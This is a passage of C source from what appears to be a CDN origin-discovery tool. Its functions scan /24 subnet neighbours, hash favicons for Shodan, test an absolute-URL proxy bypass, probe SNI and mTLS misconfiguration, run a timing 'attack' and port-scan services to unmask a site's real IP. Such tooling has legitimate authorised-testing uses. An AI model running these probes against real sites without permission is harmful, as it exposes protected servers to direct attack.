                log_result("PUBLIC_IP_MATCH", domain_ip, "Public IP Check", 90);
            } else {
                print_info("Different IP addresses");
            }
        }
    } else {
        print_error("Could not retrieve public IP");
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void check_cdn_detection(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("CDN DETECTION");
    
    // Get IPs for the domain
    DNSRecord *records = NULL;
    int record_count = 0;
    
    records = resolve_dns_native(domain, "A", &record_count);
    
    if (records && record_count > 0) {
        printf("    \033[1;37mFound \033[1;33m%d\033[1;37m A records:\033[0m\n", record_count);
        
        int cdn_count = 0;
        int non_cdn_count = 0;
        
        for (int i = 0; i < record_count; i++) {
            printf("      \033[1;37m• \033[1;33m%s\033[0m\n", records[i].value);
            
            if (is_cdn_ip(records[i].value)) {
                cdn_count++;
                printf("        \033[1;31m(CDN detected)\033[0m\n");
            } else {
                non_cdn_count++;
                printf("        \033[1;32m(Possible origin)\033[0m\n");
                
                // Log non-CDN IPs
                log_result("NON_CDN_IP", records[i].value, "CDN Detection", 60);
            }
        }
        
        printf("    \033[1;37mSummary: \033[1;33m%d\033[1;37m CDN IPs, \033[1;32m%d\033[1;37m non-CDN IPs\033[0m\n", cdn_count, non_cdn_count);
        
        if (non_cdn_count > 0) {
            print_success("Possible origin IPs found!");
        } else if (cdn_count > 0) {
            print_warning("All IPs appear to be CDN");
        }
        
        free_dns_records(records, record_count);
    } else {
        print_error("No A records found");
    }
    
    // Also check for CDN-specific headers
    CURL *curl = curl_easy_init();
    if (curl) {
        char url[256];
        snprintf(url, sizeof(url), "http://%s", domain);
        
        HttpResponse res = {0};
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request
        
        if (curl_easy_perform(curl) == CURLE_OK && res.data) {
            // Check for CDN-specific headers
            const char *cdn_headers[] = {
                "Server: cloudflare",
                "CF-Ray:",
                "X-Sucuri-ID:",
                "X-Cache:",
                "X-CDN:",
                "X-Akamai-",
                "X-Edge-",
                "X-Fastly-"
            };
            
            for (int i = 0; i < 8; i++) {
                if (strstr(res.data, cdn_headers[i])) {
                    printf("    \033[1;32m[+] CDN header detected: \033[1;36m%s\033[0m\n", cdn_headers[i]);
                }
            }
        }
        
        curl_easy_cleanup(curl);
        if (res.data) free(res.data);
    }
}

// ================================================================
// ADVANCED MODULES FROM v7.2 (ALL 4 INCLUDED)
// ================================================================

void subnet_neighbor_scan(const char *found_ip, const char *domain) {
    if(!is_valid_ip(found_ip) || !sanitize_input(domain)) return;
    
    print_method_header("SUBNET NEIGHBOR SCANNER");
    printf("    \033[1;37mScanning /24 around \033[1;33m%s\033[0m\n", found_ip);
    
    unsigned char a, b, c, d;
    sscanf(found_ip, "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
    
    int start = (d > 10) ? d - 10 : 1;
    int end = (d < 245) ? d + 10 : 254;
    
    printf("    \033[1;37mScanning range: \033[1;33m%d.%d.%d.%d-%d\033[0m\n", a, b, c, start, end);
    
    for(int i = start; i <= end; i++) {
        if(i == d) continue;
        
        char test_ip[INET_ADDRSTRLEN];
        snprintf(test_ip, sizeof(test_ip), "%d.%d.%d.%d", a, b, c, i);
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(80);
        inet_pton(AF_INET, test_ip, &server_addr.sin_addr);
        
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 500000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
        
        if(connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            char request[256];
            snprintf(request, sizeof(request),
                "HEAD / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n"
                "\r\n", domain);
            
            if(send(sock, request, strlen(request), 0) > 0) {
                char response[1024];
                ssize_t bytes = recv(sock, response, sizeof(response)-1, 0);
                if(bytes > 0) {
                    response[bytes] = 0;
                    
                    if(strstr(response, "HTTP/") && 
                       (strstr(response, "200") || strstr(response, "301") || 
                        strstr(response, "302") || strstr(response, "403") ||
                        strstr(response, "Server:"))) {
                        
                        char banner[128] = {0};
                        char *server_hdr = strstr(response, "Server:");
                        if(server_hdr) {
                            server_hdr += 7;
                            while(*server_hdr == ' ') server_hdr++;
                            char *end = strstr(server_hdr, "\r\n");
                            if(end) {
                                int len = end - server_hdr;
                                if(len > 0 && len < 127) {
                                    strncpy(banner, server_hdr, len);
                                    banner[len] = 0;
                                }
                            }
                        }
                        
                        printf("      \033[1;32m[+] Neighbor: \033[1;33m%s\033[0m", test_ip);
                        if(strlen(banner) > 0) printf(" \033[1;37m(Server: \033[1;36m%s\033[1;37m)\033[0m", banner);
                        printf("\n");
                        
                        log_result_extended("SUBNET_NEIGHBOR", test_ip, "Subnet Scan", 80, 
                                          banner, NULL, "Same subnet as known IP");
                    }
                }
            }
            close(sock);
        } else {
            close(sock);
        }
    }
}

int32_t murmurhash3(const void *key, size_t len, uint32_t seed) {
    const uint8_t *data = (const uint8_t *)key;
    const int nblocks = len / 4;
    uint32_t h1 = seed;
    const uint32_t c1 = 0xcc9e2d51;
    const uint32_t c2 = 0x1b873593;
    const uint32_t *blocks = (const uint32_t *)(data + nblocks * 4);
    
    for(int i = -nblocks; i; i++) {
        uint32_t k1 = blocks[i];
        k1 *= c1;
        k1 = (k1 << 15) | (k1 >> 17);
        k1 *= c2;
        h1 ^= k1;
        h1 = (h1 << 13) | (h1 >> 19);
        h1 = h1 * 5 + 0xe6546b64;
    }
    
    const uint8_t *tail = (const uint8_t *)(data + nblocks * 4);
    uint32_t k1 = 0;
    
    switch(len & 3) {
        case 3: k1 ^= tail[2] << 16;
        case 2: k1 ^= tail[1] << 8;
        case 1: k1 ^= tail[0];
                k1 *= c1;
                k1 = (k1 << 15) | (k1 >> 17);
                k1 *= c2;
                h1 ^= k1;
    }
    
    h1 ^= len;
    h1 ^= h1 >> 16;
    h1 *= 0x85ebca6b;
    h1 ^= h1 >> 13;
    h1 *= 0xc2b2ae35;
    h1 ^= h1 >> 16;
    
    return (int32_t)h1;
}

void favicon_fingerprint_scan(const char *ip, const char *domain) {
    if(!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("FAVICON MURMURHASH3 FINGERPRINT");
    
    CURL *curl = curl_easy_init();
    if(!curl) return;
    
    char url[512];
    HttpResponse res = {0};
    
    const char *locations[] = {
        "/favicon.ico",
        "/favicon.png",
        "/apple-touch-icon.png",
        "/apple-touch-icon-precomposed.png"
    };
    
    int found = 0;
    
    for(int i = 0; i < 4 && !found; i++) {
        snprintf(url, sizeof(url), "http://%s%s", ip, locations[i]);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        
        if(curl_easy_perform(curl) == CURLE_OK && res.data && res.size > 0) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if(response_code == 200 && res.size < 1000000) {
                int32_t hash = murmurhash3(res.data, res.size, 0);
                
                print_success("Favicon discovered");
                printf("      \033[1;37mURL: \033[1;36m%s\033[0m\n", url);
                printf("      \033[1;37mSize: \033[1;33m%zu bytes\033[0m\n", res.size);
                printf("      \033[1;37mMurmurHash3: \033[1;32m%d\033[0m\n", hash);
                printf("      \033[1;37mSearch Shodan: \033[1;36mhttp.favicon.hash:%d\033[0m\n", hash);
                
                // MD5 hash
                char md5_hash[33] = {0};
                compute_md5((const unsigned char*)res.data, res.size, md5_hash);
                printf("      \033[1;37mMD5: \033[1;33m%s\033[0m\n", md5_hash);
                
                char info[128];
                snprintf(info, sizeof(info), "Shodan: http.favicon.hash:%d", hash);
                log_result_extended("FAVICON_HASH", ip, "Favicon Fingerprint", 85, 
                                  "MurmurHash3", NULL, info);
                
                found = 1;
            }
        }
        
        free(res.data);
        res.data = NULL;
        res.size = 0;
    }
    
    if(!found) {
        struct curl_slist *headers = NULL;
        char host_header[256];
        snprintf(host_header, sizeof(host_header), "Host: %s", domain);
        headers = curl_slist_append(headers, host_header);
        
        snprintf(url, sizeof(url), "http://%s/favicon.ico", ip);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        
        if(curl_easy_perform(curl) == CURLE_OK && res.data && res.size > 0) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if(response_code == 200 && res.size < 1000000) {
                int32_t hash = murmurhash3(res.data, res.size, 0);
                print_success("Favicon (with Host header)");
                printf("      \033[1;37mURL: \033[1;36m%s\033[0m\n", url);
                printf("      \033[1;37mMurmurHash3: \033[1;32m%d\033[0m\n", hash);
                
                char info[128];
                snprintf(info, sizeof(info), "Shodan: http.favicon.hash:%d", hash);
                log_result_extended("FAVICON_HASH_HOST", ip, "Favicon Fingerprint", 85, 
                                  "MurmurHash3", NULL, info);
            }
        }
        
        curl_slist_free_all(headers);
    }
    
    curl_easy_cleanup(curl);
    if(res.data) free(res.data);
    
    if(!found) {
        print_error("No favicon found");
    }
}

void absolute_url_bypass_test(const char *domain, const char *ip) {
    if(!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("ABSOLUTE URL PATH BYPASS");
    
    CURL *curl = curl_easy_init();
    if(!curl) return;
    
    char normal_url[512];
    snprintf(normal_url, sizeof(normal_url), "http://%s/", ip);
    
    HttpResponse res_normal = {0};
    struct curl_slist *headers = NULL;
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    headers = curl_slist_append(headers, host_header);
    
    curl_easy_setopt(curl, CURLOPT_URL, normal_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res_normal);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    
    long normal_status = 0;
    if(curl_easy_perform(curl) == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &normal_status);
    }
    free(res_normal.data);
    
    curl_easy_reset(curl);
    HttpResponse res_bypass = {0};
    
    char absolute_request[512];
    snprintf(absolute_request, sizeof(absolute_request), 
             "GET http://%s/ HTTP/1.1", domain);
    
    curl_easy_setopt(curl, CURLOPT_URL, normal_url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, absolute_request);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res_bypass);
    
    long bypass_status = 0;
    if(curl_easy_perform(curl) == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &bypass_status);
        
        printf("    \033[1;37mNormal request: \033[1;33mHTTP %ld\033[0m\n", normal_status);
        printf("    \033[1;37mAbsolute URL bypass: \033[1;33mHTTP %ld\033[0m\n", bypass_status);
        
        if(bypass_status != normal_status) {
            printf("    \033[1;32m🔥 BYPASS DETECTED! Different response\033[0m\n");
            
            if(res_bypass.data) {
                char *server_hdr = strstr(res_bypass.data, "Server:");
                if(server_hdr) {
                    server_hdr += 7;
                    while(*server_hdr == ' ') server_hdr++;
                    char *end = strstr(server_hdr, "\r\n");
                    if(end) {
                        *end = 0;
                        printf("      \033[1;37mServer header: \033[1;36m%s\033[0m\n", server_hdr);
                        
                        log_result_extended("ABSOLUTE_URL_BYPASS", ip, "Absolute URL", 90, 
                                          server_hdr, NULL, "Proxy bypass successful");
                    }
                }
            }
        } else if(bypass_status == 200 || bypass_status == 301 || bypass_status == 302) {
            print_success("Server responded to absolute URL");
            log_result("ABSOLUTE_URL_RESPONSE", ip, "Absolute URL", 75);
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if(res_bypass.data) free(res_bypass.data);
}

void mtls_probe_native(const char *ip) {
    if(!is_valid_ip(ip)) return;
    
    print_method_header("NATIVE mTLS PROBING");
    
    // Download certificate if needed
    if(!mtls_cert_downloaded) {
        printf("    \033[1;37mDownloading Cloudflare origin certificate...\033[0m\n");
        
        CURL *curl = curl_easy_init();
        if(curl) {
            FILE *fp = fopen(CLOUDFLARE_CERT_FILE, "wb");
            if(fp) {
                curl_easy_setopt(curl, CURLOPT_URL, CLOUDFLARE_ORIGIN_CERT_URL);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_file_callback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
                
                if(curl_easy_perform(curl) == CURLE_OK) {
                    mtls_cert_downloaded = 1;
                    print_success("Certificate downloaded");
                }
                
                fclose(fp);
            }
            curl_easy_cleanup(curl);
        }
    }
    
    if(!mtls_cert_downloaded) {
        print_error("Certificate not available");
        return;
    }
    
    printf("    \033[1;37mTesting mTLS on \033[1;33m%s:443\033[0m\n", ip);
    
    // Create SSL context with the certificate
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        print_error("Failed to create SSL context");
        return;
    }
    
    // Load the certificate
    if (SSL_CTX_load_verify_locations(ctx, CLOUDFLARE_CERT_FILE, NULL) != 1) {
        print_error("Failed to load certificate");
        SSL_CTX_free(ctx);
        return;
    }
    
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
    
    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        return;
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    struct timeval timeout;
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return;
    }
    
    SSL_set_fd(ssl, sock);
    
    // Set SNI
    SSL_set_tlsext_host_name(ssl, "dummy.example.com");
    
    if (SSL_connect(ssl) > 0) {
        print_success("SSL connection established");
        
        // Check verification result
        long verify_result = SSL_get_verify_result(ssl);
        if (verify_result == X509_V_OK) {
            printf("    \033[1;32m🔥 mTLS VERIFICATION SUCCESS!\033[0m\n");
            log_result_extended("MTLS_VERIFIED", ip, "mTLS Probe", 95, 
                              "Cloudflare Origin", NULL, "Certificate chain verified");
        } else {
            printf("    \033[1;31m✗ Certificate verification failed: \033[1;33m%s\033[0m\n", 
                   X509_verify_cert_error_string(verify_result));
        }
    } else {
        print_error("SSL connection failed");
    }
    
    SSL_shutdown(ssl);
    close(sock);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
}

// ================================================================
// SNI DEFAULT PROBE (NEW METHOD)
// ================================================================

void sni_default_probe(const char *ip, const char *domain) {
    if(!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("SNI DEFAULT MISCONFIGURATION PROBE");
    
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        print_error("Failed to create SSL context");
        return;
    }
    
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    
    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        return;
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    struct timeval timeout;
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return;
    }
    
    SSL_set_fd(ssl, sock);
    
    // Set WRONG SNI (localhost)
    SSL_set_tlsext_host_name(ssl, "localhost");
    
    if (SSL_connect(ssl) > 0) {
        X509 *cert = SSL_get_peer_certificate(ssl);
        if (cert) {
            char subject[256] = {0};
            X509_NAME_oneline(X509_get_subject_name(cert), subject, sizeof(subject));
            
            printf("    \033[1;37mCertificate subject with wrong SNI: \033[1;36m%s\033[0m\n", subject);
            
            // Check if certificate contains target domain
            if (strstr(subject, domain) != NULL) {
                printf("    \033[1;32m🔥 SNI DEFAULT MISCONFIGURATION DETECTED!\033[0m\n");
                printf("      \033[1;37mServer returned certificate for \033[1;36m%s\033[1;37m even with wrong SNI (localhost)\033[0m\n", domain);
                
                for (int i = 0; i < candidate_count; i++) {
                    if (strcmp(candidates[i].ip, ip) == 0) {
                        candidates[i].sni_default_misconfig = 1;
                        candidates[i].confidence = fmin(100, candidates[i].confidence + 10);
                        break;
                    }
                }
                
                log_result_extended("SNI_DEFAULT_MISCONFIG", ip, "SNI Probe", 90, 
                                  subject, NULL, "Server returns target certificate with wrong SNI");
            }
            
            X509_free(cert);
        }
    }
    
    SSL_shutdown(ssl);
    close(sock);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
}

// ================================================================
// VALIDATION METHODS (INCLUDING FUZZY HASHING)
// ================================================================

void compute_sha256(const unsigned char *data, size_t len, char *sha256_hash) {
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    const EVP_MD *md = EVP_sha256();
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    
    EVP_DigestInit_ex(mdctx, md, NULL);
    EVP_DigestUpdate(mdctx, data, len);
    EVP_DigestFinal_ex(mdctx, hash, &hash_len);
    EVP_MD_CTX_free(mdctx);
    
    for (unsigned int i = 0; i < hash_len; i++) {
        sprintf(sha256_hash + (i * 2), "%02x", hash[i]);
    }
    sha256_hash[hash_len * 2] = '\0';
}

void compute_md5(const unsigned char *data, size_t len, char *md5_hash) {
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    const EVP_MD *md = EVP_md5();
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    
    EVP_DigestInit_ex(mdctx, md, NULL);
    EVP_DigestUpdate(mdctx, data, len);
    EVP_DigestFinal_ex(mdctx, hash, &hash_len);
    EVP_MD_CTX_free(mdctx);
    
    for (unsigned int i = 0; i < hash_len; i++) {
        sprintf(md5_hash + (i * 2), "%02x", hash[i]);
    }
    md5_hash[hash_len * 2] = '\0';
}

char* extract_html_title(const char *html) {
    if (!html) return NULL;
    char *title_start = strstr(html, "<title>");
    if (!title_start) return strdup("NO_TITLE");
    title_start += 7;
    char *title_end = strstr(title_start, "</title>");
    if (!title_end) return strdup("NO_TITLE");
    size_t title_len = title_end - title_start;
    char *title = malloc(title_len + 1);
    if (!title) return NULL;
    strncpy(title, title_start, title_len);
    title[title_len] = '\0';
    return title;
}

void html_fuzzy_hashing_validation(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("FUZZY HTML STRUCTURAL VALIDATION");
    
    // First capture domain fuzzy fingerprint
    if (!domain_fingerprint.fuzzy_hash) {
        printf("    \033[1;37mCapturing domain fuzzy fingerprint...\033[0m\n");
        
        CURL *curl = curl_easy_init();
        if (curl) {
            char url[256];
            snprintf(url, sizeof(url), "https://%s", domain);
            
            HttpResponse res = {0};
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
            
            if (curl_easy_perform(curl) == CURLE_OK && res.data) {
                // Extract tags only
                char tags_only[65536];
                extract_html_tags_only(res.data, tags_only, sizeof(tags_only));
                
                // Compute hash of tags only
                char fuzzy_hash[65];
                compute_sha256((const unsigned char*)tags_only, strlen(tags_only), fuzzy_hash);
                
                domain_fingerprint.fuzzy_hash = strdup(fuzzy_hash);
                domain_fingerprint.tags_only = strdup(tags_only);
                
                print_success("Domain fuzzy fingerprint captured");
            }
            
            curl_easy_cleanup(curl);
            if (res.data) free(res.data);
        }
    }
    
    if (!domain_fingerprint.fuzzy_hash) {
        print_error("Could not capture domain fingerprint");
        return;
    }
    
    printf("    \033[1;37mValidating IP \033[1;33m%s\033[0m\n", ip);
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s", ip);
    
    HttpResponse res = {0};
    struct curl_slist *headers = NULL;
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    headers = curl_slist_append(headers, host_header);
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        if (response_code == 200) {
            // Extract tags only from IP response
            char ip_tags_only[65536];
            extract_html_tags_only(res.data, ip_tags_only, sizeof(ip_tags_only));
            
            // Compute fuzzy hash
            char ip_fuzzy_hash[65];
            compute_sha256((const unsigned char*)ip_tags_only, strlen(ip_tags_only), ip_fuzzy_hash);
            
            // Calculate similarity
            int similarity = fuzzy_string_match(domain_fingerprint.tags_only, ip_tags_only);
            
            printf("    \033[1;37mFuzzy similarity: \033[1;33m%d%%\033[0m\n", similarity);
            
            if (similarity > 90) {
                printf("    \033[1;32m🔥 HIGH FUZZY MATCH! \033[1;37m(Similarity: \033[1;32m%d%%\033[1;37m)\033[0m\n", similarity);
                
                for (int i = 0; i < candidate_count; i++) {
                    if (strcmp(candidates[i].ip, ip) == 0) {
                        candidates[i].fuzzy_html_match = similarity;
                        candidates[i].confidence = fmin(100, candidates[i].confidence + 
                                                       (similarity > 95 ? 15 : 10));
                        break;
                    }
                }
                
                char info[128];
                snprintf(info, sizeof(info), "Fuzzy HTML match: %d%%", similarity);
                log_result_extended("FUZZY_HTML_MATCH", ip, "Fuzzy HTML", 
                                  fmin(100, 80 + similarity/5), NULL, NULL, info);
            } else if (similarity > 70) {
                printf("    \033[1;33m⚠ Moderate fuzzy match (\033[1;33m%d%%\033[1;33m)\033[0m\n", similarity);
            } else {
                printf("    \033[1;31m✗ Low fuzzy match (\033[1;31m%d%%\033[1;31m)\033[0m\n", similarity);
            }
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

// ================================================================
// MISSING FUNCTION IMPLEMENTATIONS
// ================================================================

double measure_ttfb(const char *url, const char *host_header) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    HttpResponse res = {0};
    struct curl_slist *headers = NULL;
    if (host_header) {
        headers = curl_slist_append(headers, host_header);
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    if (headers) curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request for TTFB
    
    CURLcode result = curl_easy_perform(curl);
    gettimeofday(&end, NULL);
    
    double ttfb = -1;
    if (result == CURLE_OK) {
        ttfb = (end.tv_sec - start.tv_sec) * 1000.0;
        ttfb += (end.tv_usec - start.tv_usec) / 1000.0;
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
    
    return ttfb;
}

void proxy_penalty_timing_attack(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("PROXY PENALTY TIMING ATTACK");
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s", ip);
    
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    
    // Measure TTFB with and without Host header
    double ttfb_with_host = measure_ttfb(url, host_header);
    double ttfb_without_host = measure_ttfb(url, NULL);
    
    if (ttfb_with_host > 0 && ttfb_without_host > 0) {
        printf("    \033[1;37mTTFB with Host header: \033[1;33m%.2f ms\033[0m\n", ttfb_with_host);
        printf("    \033[1;37mTTFB without Host header: \033[1;33m%.2f ms\033[0m\n", ttfb_without_host);
        
        double difference = ttfb_with_host - ttfb_without_host;
        printf("    \033[1;37mDifference: \033[1;33m%.2f ms\033[0m\n", difference);
        
        if (difference > PROXY_PENALTY_THRESHOLD_MS) {
            printf("    \033[1;32m🔥 PROXY DETECTED! Host header adds \033[1;33m%.2f ms\033[1;32m penalty\033[0m\n", difference);
            // This suggests the IP is behind a proxy/CDN
        } else if (difference < 0) {
            printf("    \033[1;33m⚠ Negative difference - might be measurement noise\033[0m\n");
        } else {
            printf("    \033[1;37m~ No significant proxy penalty detected\033[0m\n");
            // This suggests the IP might be the origin
            for (int i = 0; i < candidate_count; i++) {
                if (strcmp(candidates[i].ip, ip) == 0) {
                    candidates[i].confidence = fmin(100, candidates[i].confidence + 5);
                    break;
                }
            }
        }
    } else {
        print_error("Could not measure TTFB");
    }
}

void cross_protocol_service_correlation(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("CROSS-PROTOCOL SERVICE CORRELATION");
    
    // Check multiple services on the same IP
    int ports[] = {22, 25, 53, 110, 143, 465, 587, 993, 995, 3306, 3389, 5432, 8080, 8443};
    const char *services[] = {"SSH", "SMTP", "DNS", "POP3", "IMAP", "SMTPS", "Submission", 
                             "IMAPS", "POP3S", "MySQL", "RDP", "PostgreSQL", "HTTP-Alt", "HTTPS-Alt"};
    
    printf("    \033[1;37mScanning common services on \033[1;33m%s\033[0m\n", ip);
    
    int open_ports = 0;
    char port_list[256] = {0};
    
    for (int i = 0; i < 14; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(ports[i]);
        inet_pton(AF_INET, ip, &server_addr.sin_addr);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            printf("      \033[1;32m[+] \033[1;36m%s \033[1;37m(\033[1;33m%d\033[1;37m) is open\033[0m\n", services[i], ports[i]);
            open_ports++;
            
            // Add to port list
            char port_str[16];
            snprintf(port_str, sizeof(port_str), "%d,", ports[i]);
            strncat(port_list, port_str, sizeof(port_list) - strlen(port_list) - 1);
            
            close(sock);
        } else {
            close(sock);
        }
    }
    
